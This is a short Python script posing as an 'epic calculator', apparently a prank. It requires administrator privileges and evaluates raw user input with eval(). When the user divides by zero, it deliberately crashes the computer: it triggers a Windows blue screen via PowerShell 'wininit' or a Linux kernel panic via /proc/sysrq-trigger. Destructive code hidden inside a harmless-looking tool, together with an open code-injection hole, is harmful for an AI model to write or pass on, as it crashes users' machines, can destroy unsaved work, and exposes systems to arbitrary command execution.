import platform
import os
SO = platform.system()
root = False

# check if user is root so that the program can keep running
try:
    if os.getuid() == 0:
        root = True
except AttributeError:
    import ctypes
    if ctypes.windll.shell32.IsUserAnAdmin() != 0:
        root = True

if root == False:
    print("This program cannot run properly without administrator privileges.")
    exit()

# main
print("Welcome to epic calculator!")
while 1:
    eq = input("Input a mathematical equation to solve: ")
    try:
        # very dangerous
        print(eval(eq))
    except ZeroDivisionError:
        if SO == "Windows":
            os.system('powershell -Command "wininit"') # BSOD for Windows
        elif SO == "Linux":
            os.system('echo c > /proc/sysrq-trigger') # kernel panic for Linux
        else:
            print("lolz you're not running a supported os, wait 4 supportz m8!!!!!")
